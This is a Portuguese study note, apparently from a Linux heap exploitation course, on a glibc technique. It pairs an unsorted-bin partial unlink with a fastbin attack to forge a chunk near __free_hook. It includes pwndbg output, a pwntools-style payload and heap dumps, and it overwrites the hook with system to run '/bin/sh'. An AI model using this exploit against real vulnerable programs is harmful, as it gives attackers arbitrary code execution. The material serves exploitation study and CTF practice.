- [Teoria](#teoria)
- [Ataque](#ataque)
- [Créditos](#créditos)

# Teoria
Nos nao podemos usar um fastbin ataque contra o __free_hook

```x86asm
pwndbg> find_fake_fast &__malloc_hook
FAKE CHUNKS
Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7faf95b38acd
prev_size: 0xaf95b34f00000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0xaf957e10d0000000
bk_nextsize: 0x7f

pwndbg> find_fake_fast &__free_hook
FAKE CHUNKS
```

Porem, se usarmos o write do parcial unlink dos 
unsortedbins em um endereço **ANTES** do __free_hook (ou algum 
outro hook interessante), nos vamos escrever `7f12345678`

Porem, esse valor nao é muito util para um size. Porem se nos 
mirarmos com um offset nao múltiplo de 16, e separarmos o endereço:
```
0000000000 7f12345678  Inútil

0012345678 000000007f  Util: Fastbin 0x70
```

No caso do __free_hook vários funcionam, porem esse offset é o 
mais proximo: 
> unsorted = libc.sym.__free_hook - 0x23

E o endereço do chunk falso:

> fast = libc.sym.__free_hook - 0x16

```x86asm
pwndbg> find_fake_fast &__free_hook 
FAKE CHUNKS
Fake chunk | Free chunk (fastbins) | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7f825ea93772
prev_size: 0x825ea91b58000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```
# Ataque

Voce ira precisar corromper os metadados de um `free fast 0x70` e um `free unsorted`

Assim para simplificar, vamos assumir a seguinte configuração do heap:
```
 ___________  Fastbin 0x70 (Free)
|           | 
|___________|
|           | Unsorted Bin (Free)
|___________| 
```
E nos possuímos um UAF que no fast que nos permite dar um overflow ate o 
unsorted

```py
UAF(flat(#                       unsorted | fast
    libc.sym.__free_hook - 0x16,#         | fd
    b"R"*8*12,#                           | pad
    0x21,#                           size |
    0,#                                fd |
    libc.sym.__free_hook - 0x23,#      bk |
))
```

```x86asm
0x0000000000000000	0x0000000000000071	........q.......	 <-- fastbins[0x70][0]
0x00007f2208207772	0x5252525252525252	rw ."...RRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x0000000000000021	RRRRRRRR!.......	 <-- unsortedbin[all][0]
0x0000000000000000	0x00007f2208207765	........ew ."...
```

Agora basta alocar o unsortedbin, causando o unsorted bin unlink

> malloc(0x18)

```x86asm
pwndbg> find_fake_fast &__free_hook 
FAKE CHUNKS
Fake chunk | Free chunk (fastbins) | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7f2208207772
prev_size: 0x2208205b58000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```

Em seguida, alocar o fast 
> malloc(0x68) # consumir

> chunk_hook = malloc(0x68) # __free_hook

E pronto, agora basta corromper o free hook

> `edit`(`chunk_hook`, b`"\0"`*`6` + `p64`(`libc.sym.system`))

Assim, chamando:
```py
free( p64( next( libc.search(b"/bin/sh\x00"))))

ou caso em um ctf, aonde voce so consegue passar o index de um chunk
para ser free... basta colocar /bin/sh como a primeira coisa no data 

edit(chunk_ABC, b"/bin/sh\x00")
free(chunk_ABC)

Assim, por trás dos panos vira: free(pointer /bin/sh)
```
# Créditos 
https://www.udemy.com/course/linux-heap-exploitation-part-2/